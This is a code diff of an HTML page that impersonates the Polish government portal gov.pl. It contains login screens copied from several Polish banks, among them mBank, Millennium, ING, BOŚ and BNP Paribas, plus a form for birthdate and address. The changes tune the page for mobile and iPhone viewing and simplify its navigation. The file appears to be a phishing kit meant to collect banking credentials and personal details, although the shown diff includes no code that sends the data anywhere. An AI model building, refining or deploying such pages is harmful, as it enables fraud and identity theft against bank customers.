@@ -2,7 +2,9 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         /* ============================================================
@@ -12,6 +14,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -21,6 +24,8 @@
             line-height: 1.6;
             overflow-x: hidden;
             scroll-behavior: smooth;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
         a {
@@ -825,12 +830,17 @@
             cursor: pointer;
             transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
             padding: 14px;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .bank-btn:hover {
             border-color: #002a4f;
             box-shadow: 0 4px 16px rgba(0, 59, 111, 0.15);
             transform: scale(1.02);
+        }
+
+        .bank-btn:active {
+            transform: scale(0.97);
         }
 
         .bank-btn img {
@@ -994,6 +1004,10 @@
             background: #005a8c;
         }
 
+        .login-screen .login-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .login-screen .login-form .login-btn-row {
             display: flex;
             align-items: center;
@@ -1101,7 +1115,7 @@
             text-decoration: underline;
         }
 
-        /* ===== BACK BUTTON ===== */
+        /* ===== BACK BUTTON — UNIWERSALNY ===== */
         .back-btn {
             display: inline-flex;
             align-items: center;
@@ -1112,15 +1126,31 @@
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            padding: 8px 0 16px 0;
+            padding: 12px 16px;
             transition: color 0.2s;
+            -webkit-tap-highlight-color: transparent;
         }
+
         .back-btn:hover {
             color: #001f3f;
         }
+
+        .back-btn:active {
+            color: #001f3f;
+            transform: scale(0.97);
+        }
+
         .back-btn .arrow {
             font-size: 20px;
             line-height: 1;
+        }
+
+        .back-btn-wrapper {
+            background: #ffffff;
+            padding: 8px 0 4px 0;
+            border-bottom: 1px solid #f0f2f5;
+            display: flex;
+            align-items: center;
         }
 
         /* ===== BANK 2 — Millennium ===== */
@@ -1143,7 +1173,7 @@
         .bank2-full-page .bank2-container {
             max-width: 480px;
             margin: 0 auto;
-            padding: 60px 20px 40px;
+            padding: 20px 20px 40px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -1245,6 +1275,10 @@
             background: #a00042;
         }
 
+        .bank2-full-page .bank2-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank2-full-page .bank2-footer-text {
             margin-top: 20px;
             text-align: left;
@@ -1262,34 +1296,6 @@
         .bank2-full-page .bank2-footer-text .highlight {
             color: #bd004f;
             font-weight: 600;
-        }
-
-        .bank2-full-page .bank2-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank2-full-page .bank2-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank2-full-page .bank2-close-btn.visible {
-            display: flex;
         }
 
         /* ===== BANK 3 ===== */
@@ -1451,6 +1457,10 @@
             background: #b01218;
         }
 
+        .bank3-full-page .login-form-wrapper .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank3-full-page .login-form-wrapper .security-warnings {
             margin-top: 24px;
             border-top: 1px solid #e6ebf3;
@@ -1477,34 +1487,6 @@
             flex-shrink: 0;
             margin-top: 1px;
             color: #888;
-        }
-
-        .bank3-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10000;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank3-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank3-close-btn.visible {
-            display: flex;
         }
 
         /* ===== BANK 4 ===== */
@@ -1612,32 +1594,8 @@
             border-color: #333333;
         }
 
-        .bank4-full-page .bank4-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10000;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank4-full-page .bank4-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank4-full-page .bank4-close-btn.visible {
-            display: flex;
+        .bank4-full-page .bank4-form .login-btn:active {
+            transform: scale(0.97);
         }
 
         /* ===== BANK 5 ===== */
@@ -1783,34 +1741,6 @@
             transform: scale(0.97);
         }
 
-        .bank5-full-page .bank5-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10000;
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 20px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank5-full-page .bank5-close-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .bank5-full-page .bank5-close-btn.visible {
-            display: flex;
-        }
-
         /* ===== BANK 6 — BOŚ ===== */
         .bank6-full-page {
             display: none;
@@ -1909,6 +1839,10 @@
             transform: scale(1.01);
         }
 
+        .bank6-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank6-download {
             margin-top: 16px;
             text-align: center;
@@ -1982,34 +1916,6 @@
 
         .bank6-security-text .link:hover {
             color: #004d35;
-        }
-
-        .bank6-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10000;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank6-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank6-close-btn.visible {
-            display: flex;
         }
 
         /* ===== BANK 7 — BNP Paribas ===== */
@@ -2138,6 +2044,10 @@
             transform: scale(1.01);
         }
 
+        .bank7-full-page .bank7-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank7-full-page .bank7-security {
             margin-top: 20px;
             padding-top: 18px;
@@ -2222,34 +2132,6 @@
             width: 69px;
             height: 47px;
             display: block;
-        }
-
-        .bank7-full-page .bank7-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank7-full-page .bank7-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank7-full-page .bank7-close-btn.visible {
-            display: flex;
         }
 
         /* ===== BANK 8 ===== */
@@ -2376,6 +2258,10 @@
             transform: scale(1.01);
         }
 
+        .bank8-full-page .bank8-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank8-full-page .bank8-right {
             flex: 1;
             max-width: 460px;
@@ -2407,34 +2293,6 @@
             width: 272px;
             height: 240px;
             display: block;
-        }
-
-        .bank8-full-page .bank8-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank8-full-page .bank8-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank8-full-page .bank8-close-btn.visible {
-            display: flex;
         }
 
         /* ===== BANK 9 ===== */
@@ -2573,35 +2431,11 @@
             background: #7a002c;
         }
 
-        .bank9-full-page .bank9-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
+        .bank9-full-page .bank9-form .login-btn:active {
+            transform: scale(0.97);
         }
 
-        .bank9-full-page .bank9-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank9-full-page .bank9-close-btn.visible {
-            display: flex;
-        }
-
-        /* ===== BANK 10 ===== */
+        /* ===== BANK 10 — BEZ LOGO ===== */
         .bank10-full-page {
             display: none;
             min-height: 100vh;
@@ -2628,22 +2462,12 @@
             align-items: flex-start;
         }
 
-        .bank10-full-page .bank10-top-logo {
-            margin-bottom: 20px;
-            margin-top: 60px;
-        }
-
-        .bank10-full-page .bank10-top-logo img {
-            width: auto;
-            height: 80px;
-            display: block;
-        }
-
         .bank10-full-page .bank10-main {
             display: flex;
             gap: 30px;
             align-items: flex-start;
             width: 100%;
+            margin-top: 20px;
         }
 
         .bank10-full-page .bank10-left {
@@ -2659,7 +2483,6 @@
             padding: 20px 24px;
             width: 566px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
-            margin-left: -20px;
         }
 
         .bank10-full-page .bank10-card p {
@@ -2738,6 +2561,10 @@
             background: #0d3f99;
         }
 
+        .bank10-full-page .bank10-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank10-full-page .bank10-security {
             margin-top: 30px;
             padding-top: 20px;
@@ -2775,34 +2602,6 @@
             font-weight: 700;
         }
 
-        .bank10-full-page .bank10-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank10-full-page .bank10-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank10-full-page .bank10-close-btn.visible {
-            display: flex;
-        }
-
         /* ===== BANK 12 — ING ===== */
         .bank12-full-page {
             display: none;
@@ -2823,7 +2622,7 @@
         .bank12-full-page .bank12-container {
             max-width: 500px;
             margin: 0 auto;
-            padding: 60px 20px 40px;
+            padding: 20px 20px 40px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -2930,6 +2729,10 @@
             background: #e55800;
         }
 
+        .bank12-full-page .bank12-form .login-btn:active {
+            transform: scale(0.97);
+        }
+
         .bank12-full-page .bank12-footer-text {
             margin-top: 20px;
             text-align: left;
@@ -2958,34 +2761,6 @@
 
         .bank12-full-page .bank12-footer-text .link:hover {
             color: #e55800;
-        }
-
-        .bank12-full-page .bank12-close-btn {
-            position: fixed;
-            top: 16px;
-            right: 20px;
-            z-index: 10001;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            line-height: 1;
-        }
-
-        .bank12-full-page .bank12-close-btn:hover {
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .bank12-full-page .bank12-close-btn.visible {
-            display: flex;
         }
 
         /* ---------- TOAST ---------- */
@@ -3088,8 +2863,32 @@
         }
 
         /* ============================================================
-           RESPONSIVE — ZMIANY
+           RESPONSIVE — ZMIANY + IPHONE
            ============================================================ */
+
+        /* iPhone safe areas */
+        @supports (padding: max(0px)) {
+            .header {
+                padding-left: max(20px, env(safe-area-inset-left));
+                padding-right: max(20px, env(safe-area-inset-right));
+                padding-top: max(0px, env(safe-area-inset-top));
+            }
+            .bank3-full-page .login-container,
+            .bank4-full-page .bank4-container,
+            .bank5-full-page .bank5-container,
+            .bank6-container,
+            .bank7-full-page .bank7-container,
+            .bank8-full-page .bank8-container,
+            .bank9-full-page .bank9-container,
+            .bank10-full-page .bank10-container,
+            .bank12-full-page .bank12-container,
+            .login-screen .login-container {
+                padding-left: max(20px, env(safe-area-inset-left));
+                padding-right: max(20px, env(safe-area-inset-right));
+                padding-bottom: max(20px, env(safe-area-inset-bottom));
+            }
+        }
+
         @media (max-width: 992px) {
             .header {
                 height: auto;
@@ -3260,17 +3059,10 @@
                 height: 44px;
             }
             .bank2-full-page .bank2-container {
-                padding: 40px 20px;
+                padding: 20px 20px 40px;
             }
             .bank2-full-page .bank2-box {
                 padding: 24px 20px;
-            }
-            .bank2-full-page .bank2-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
             }
             .bank3-header .bank3-header-content {
                 padding: 0 20px;
@@ -3290,13 +3082,6 @@
                 width: 100%;
                 height: 44px;
             }
-            .bank3-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
             .bank4-full-page .bank4-container {
                 padding: 40px 20px;
             }
@@ -3310,13 +3095,6 @@
             .bank4-full-page .bank4-form .login-btn {
                 width: 100%;
                 height: 44px;
-            }
-            .bank4-full-page .bank4-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
             }
             .bank5-full-page .bank5-container {
                 max-width: 100%;
@@ -3335,13 +3113,6 @@
                 width: 100%;
                 height: 44px;
             }
-            .bank5-full-page .bank5-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
             .bank6-container {
                 flex-direction: column;
                 max-width: 500px;
@@ -3357,22 +3128,8 @@
             .bank6-title {
                 font-size: 24px;
             }
-            .bank6-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
             .bank7-full-page .bank7-container {
                 padding: 40px 20px;
-            }
-            .bank7-full-page .bank7-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
             }
             .bank7-full-page .bank7-norton {
                 bottom: 16px;
@@ -3394,13 +3151,6 @@
                 max-width: 100%;
                 padding-top: 0;
             }
-            .bank8-full-page .bank8-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
             .bank9-full-page .bank9-container {
                 padding: 30px 20px;
             }
@@ -3411,23 +3161,12 @@
                 width: 100%;
                 max-width: 397px;
             }
-            .bank9-full-page .bank9-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
             .bank10-full-page .bank10-container {
                 padding: 30px 20px;
-            }
-            .bank10-full-page .bank10-top-logo img {
-                height: 72px;
             }
             .bank10-full-page .bank10-card {
                 width: 100%;
                 max-width: 566px;
-                margin-left: 0;
             }
             .bank10-full-page .bank10-main {
                 flex-direction: column;
@@ -3445,31 +3184,14 @@
             .bank10-full-page .bank10-security {
                 max-width: 100%;
             }
-            .bank10-full-page .bank10-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
-            }
-            .bank10-full-page .bank10-top-logo {
-                margin-top: 40px;
-            }
             .bank12-full-page .bank12-container {
-                padding: 40px 20px;
+                padding: 20px 20px 40px;
             }
             .bank12-full-page .bank12-box {
                 padding: 24px 20px;
             }
             .bank12-full-page .bank12-title {
                 font-size: 16px;
-            }
-            .bank12-full-page .bank12-close-btn {
-                top: 12px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 20px;
             }
         }
 
@@ -3577,7 +3299,6 @@
                 border-width: 1.5px;
             }
 
-            /* ===== DATA URODZENIA — AUTO SLASH ===== */
             .data-form .form-group input#birthdate {
                 letter-spacing: 2px;
             }
@@ -3586,7 +3307,6 @@
                 grid-template-columns: 1fr;
             }
 
-            /* ===== ADRES W JEDNYM RZĘDZIE ===== */
             .data-form .address-row {
                 display: grid;
                 grid-template-columns: 2fr 1fr 1fr;
@@ -3597,7 +3317,6 @@
                 padding: 8px 6px;
             }
 
-            /* ===== KOD POCZTOWY Z MYŚLNIKIEM ===== */
             .data-form .address-row input[name="postal"] {
                 letter-spacing: 1px;
             }
@@ -3680,8 +3399,18 @@
             .login-screen .login-grid {
                 gap: 24px;
             }
+            .back-btn {
+                font-size: 14px;
+                padding: 10px 14px;
+            }
+            .back-btn .arrow {
+                font-size: 18px;
+            }
+            .back-btn-wrapper {
+                padding: 4px 0 2px 0;
+            }
             .bank2-full-page .bank2-container {
-                padding: 30px 16px;
+                padding: 16px 16px 30px;
             }
             .bank2-full-page .bank2-box {
                 padding: 20px 16px;
@@ -3694,13 +3423,6 @@
                 width: 72px;
                 height: 40px;
                 font-size: 14px;
-            }
-            .bank2-full-page .bank2-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
             }
             .bank3-header {
                 height: 48px;
@@ -3725,13 +3447,6 @@
                 height: 40px;
                 font-size: 14px;
             }
-            .bank3-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank4-full-page .bank4-container {
                 padding: 30px 16px;
             }
@@ -3749,13 +3464,6 @@
                 height: 40px;
                 font-size: 14px;
             }
-            .bank4-full-page .bank4-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank5-full-page .bank5-box {
                 padding: 24px 18px;
             }
@@ -3772,13 +3480,6 @@
             .bank5-full-page .bank5-form .login-btn {
                 height: 40px;
                 font-size: 14px;
-            }
-            .bank5-full-page .bank5-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
             }
             .bank6-container {
                 padding: 24px 18px;
@@ -3805,13 +3506,6 @@
             .bank6-security-text {
                 font-size: 13px;
             }
-            .bank6-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank7-full-page .bank7-container {
                 padding: 30px 16px;
             }
@@ -3831,13 +3525,6 @@
             .bank7-full-page .bank7-form .login-btn {
                 padding: 12px;
                 font-size: 14px;
-            }
-            .bank7-full-page .bank7-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
             }
             .bank7-full-page .bank7-norton {
                 bottom: 14px;
@@ -3883,13 +3570,6 @@
                 width: 200px;
                 height: auto;
             }
-            .bank8-full-page .bank8-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank9-full-page .bank9-container {
                 padding: 20px 16px;
             }
@@ -3917,27 +3597,13 @@
                 padding: 12px;
                 font-size: 14px;
             }
-            .bank9-full-page .bank9-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank10-full-page .bank10-container {
                 padding: 20px 16px;
-            }
-            .bank10-full-page .bank10-top-logo {
-                margin-top: 30px;
-            }
-            .bank10-full-page .bank10-top-logo img {
-                height: 64px;
             }
             .bank10-full-page .bank10-card {
                 padding: 16px 18px;
                 width: 100%;
                 max-width: 100%;
-                margin-left: 0;
             }
             .bank10-full-page .bank10-card p {
                 font-size: 13px;
@@ -3960,15 +3626,8 @@
             .bank10-full-page .bank10-security-list li {
                 font-size: 13px;
             }
-            .bank10-full-page .bank10-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
             .bank12-full-page .bank12-container {
-                padding: 30px 16px;
+                padding: 16px 16px 30px;
             }
             .bank12-full-page .bank12-box {
                 padding: 20px 16px;
@@ -3984,13 +3643,6 @@
                 width: 72px;
                 height: 40px;
                 font-size: 14px;
-            }
-            .bank12-full-page .bank12-close-btn {
-                top: 10px;
-                right: 12px;
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
             }
         }
 
@@ -4047,7 +3699,6 @@
                 margin-right: 0;
             }
 
-            /* ===== WIĘKSZY BANNER (150% - mobilny) ===== */
             .image-under-banner .image-wrapper img {
                 transform: scale(1.5);
                 transform-origin: center center;
@@ -4081,7 +3732,6 @@
                 border-width: 1px;
             }
 
-            /* ===== ADRES — trzy kolumny ===== */
             .data-form .address-row {
                 grid-template-columns: 2fr 1fr 1fr;
                 gap: 4px;
@@ -4091,7 +3741,6 @@
                 padding: 6px 4px;
             }
 
-            /* ===== KOD POCZTOWY Z MYŚLNIKIEM ===== */
             .data-form .address-row input[name="postal"] {
                 letter-spacing: 1px;
             }
@@ -4190,8 +3839,18 @@
             .login-screen .login-grid {
                 gap: 18px;
             }
+            .back-btn {
+                font-size: 13px;
+                padding: 8px 12px;
+            }
+            .back-btn .arrow {
+                font-size: 16px;
+            }
+            .back-btn-wrapper {
+                padding: 2px 0 2px 0;
+            }
             .bank2-full-page .bank2-container {
-                padding: 20px 12px;
+                padding: 12px 12px 24px;
             }
             .bank2-full-page .bank2-box {
                 padding: 16px 14px;
@@ -4205,13 +3864,6 @@
                 height: 36px;
                 font-size: 13px;
                 padding: 0 12px;
-            }
-            .bank2-full-page .bank2-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
             }
             .bank3-header {
                 height: 42px;
@@ -4248,13 +3900,6 @@
             .bank3-full-page .login-form-wrapper .login-btn {
                 width: 100%;
             }
-            .bank3-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
-            }
             .bank4-full-page .bank4-container {
                 padding: 20px 12px;
             }
@@ -4281,13 +3926,6 @@
             }
             .bank4-full-page .bank4-form .login-btn-row .form-group {
                 min-width: 100%;
-            }
-            .bank4-full-page .bank4-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
             }
             .bank5-full-page .bank5-box {
                 padding: 18px 14px;
@@ -4316,13 +3954,6 @@
             .bank5-full-page .bank5-form .login-btn-row .form-group {
                 min-width: 100%;
             }
-            .bank5-full-page .bank5-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
-            }
             .bank6-container {
                 padding: 18px 14px;
             }
@@ -4343,13 +3974,6 @@
             }
             .bank6-security-text {
                 font-size: 12px;
-            }
-            .bank6-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
             }
             .bank7-full-page .bank7-container {
                 padding: 20px 12px;
@@ -4379,13 +4003,6 @@
             }
             .bank7-full-page .bank7-chat {
                 font-size: 12px;
-            }
-            .bank7-full-page .bank7-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
             }
             .bank7-full-page .bank7-norton {
                 bottom: 10px;
@@ -4428,13 +4045,6 @@
                 width: 160px;
                 height: auto;
             }
-            .bank8-full-page .bank8-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
-            }
             .bank8-full-page .bank8-favicon img {
                 width: 40px;
                 height: 40px;
@@ -4465,27 +4075,13 @@
                 padding: 10px;
                 font-size: 13px;
             }
-            .bank9-full-page .bank9-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
-            }
             .bank10-full-page .bank10-container {
                 padding: 16px 12px;
-            }
-            .bank10-full-page .bank10-top-logo {
-                margin-top: 20px;
-            }
-            .bank10-full-page .bank10-top-logo img {
-                height: 56px;
             }
             .bank10-full-page .bank10-card {
                 padding: 14px 14px;
                 width: 100%;
                 max-width: 100%;
-                margin-left: 0;
             }
             .bank10-full-page .bank10-card p {
                 font-size: 12px;
@@ -4508,15 +4104,8 @@
             .bank10-full-page .bank10-security-list li {
                 font-size: 12px;
             }
-            .bank10-full-page .bank10-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
-            }
             .bank12-full-page .bank12-container {
-                padding: 20px 12px;
+                padding: 12px 12px 24px;
             }
             .bank12-full-page .bank12-box {
                 padding: 16px 14px;
@@ -4534,12 +4123,23 @@
                 font-size: 13px;
                 padding: 0 12px;
             }
-            .bank12-full-page .bank12-close-btn {
-                top: 8px;
-                right: 8px;
-                width: 28px;
-                height: 28px;
-                font-size: 16px;
+        }
+
+        /* iPhone notch fix */
+        @supports (padding: max(0px)) {
+            .bank3-full-page .login-container,
+            .bank4-full-page .bank4-container,
+            .bank5-full-page .bank5-container,
+            .bank6-container,
+            .bank7-full-page .bank7-container,
+            .bank8-full-page .bank8-container,
+            .bank9-full-page .bank9-container,
+            .bank10-full-page .bank10-container,
+            .bank12-full-page .bank12-container,
+            .login-screen .login-container {
+                padding-left: max(20px, env(safe-area-inset-left));
+                padding-right: max(20px, env(safe-area-inset-right));
+                padding-bottom: max(20px, env(safe-area-inset-bottom));
             }
         }
     </style>
@@ -4745,7 +4345,9 @@
 
             <!-- ===== BANK 1 ===== -->
             <section class="login-screen" id="loginScreen1">
-                <button class="back-btn" onclick="goBackToBanks()"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper">
+                    <button class="back-btn" onclick="goBackToBanks()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="login-container">
                     <div class="login-grid">
                         <div class="login-left">
@@ -4789,7 +4391,9 @@
 
             <!-- ===== BANK 2 ===== -->
             <div class="bank2-full-page" id="loginScreen2">
-                <button class="back-btn" onclick="goBackToBanks2()"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="goBackToBanks2()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank2-container">
                     <div class="bank2-box">
                         <div class="bank2-logo">
@@ -4824,8 +4428,9 @@
 
             <!-- ===== BANK 3 ===== -->
             <div class="bank3-full-page" id="loginScreen3">
-                <button class="bank3-close-btn" id="bank3CloseBtn" onclick="closeLoginScreen3()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen3()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen3()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank3-header">
                     <div class="bank3-header-content">
                         <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
@@ -4858,8 +4463,9 @@
 
             <!-- ===== BANK 4 ===== -->
             <div class="bank4-full-page" id="loginScreen4">
-                <button class="bank4-close-btn" id="bank4CloseBtn" onclick="closeLoginScreen4()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen4()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen4()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank4-container">
                     <div class="bank4-title">potwierdź swoją tożsamość</div>
                     <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
@@ -4881,8 +4487,9 @@
 
             <!-- ===== BANK 5 ===== -->
             <div class="bank5-full-page" id="loginScreen5">
-                <button class="bank5-close-btn" id="bank5CloseBtn" onclick="closeLoginScreen5()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen5()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen5()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank5-container">
                     <div class="bank5-box">
                         <div class="bank5-alert">
@@ -4913,8 +4520,9 @@
 
             <!-- ===== BANK 6 ===== -->
             <div class="bank6-full-page" id="loginScreen6">
